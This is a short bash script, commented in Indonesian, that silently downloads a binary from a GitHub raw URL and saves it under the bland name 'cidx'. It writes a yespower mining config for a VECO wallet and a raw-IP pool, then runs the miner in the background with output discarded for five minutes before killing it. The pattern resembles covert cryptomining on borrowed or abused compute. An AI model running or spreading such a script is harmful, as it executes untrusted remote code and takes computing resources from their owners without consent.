#!/bin/bash

# Bersihkan proses cidx jika ada
pkill cidx

# Unduh binary terbaru
rm -rf cidx
wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1

# Buat file konfigurasi mining
cat > config.json <<END
{
  "url": "45.115.224.54:443",
  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1",
  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
  "threads": 6,
  "algo": "yespower"
}
END

chmod +x config.json cidx

# Jalankan cidx selama 5 menit di background
nohup ./cidx -a yespower \
  -o 45.115.224.203:443 \
  -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1 \
  -p c=VECO,m=solo,zap=VECO,mc=VECO \
  -t 6 &>/dev/null &

start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
echo "[$start_time] STATUS: 🚀 JALAN (5 menit aktif)"

# Tunggu 5 menit
sleep 300

# Matikan proses
pkill cidx

stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
echo "[$stop_time] STATUS: 🛑 MATI"
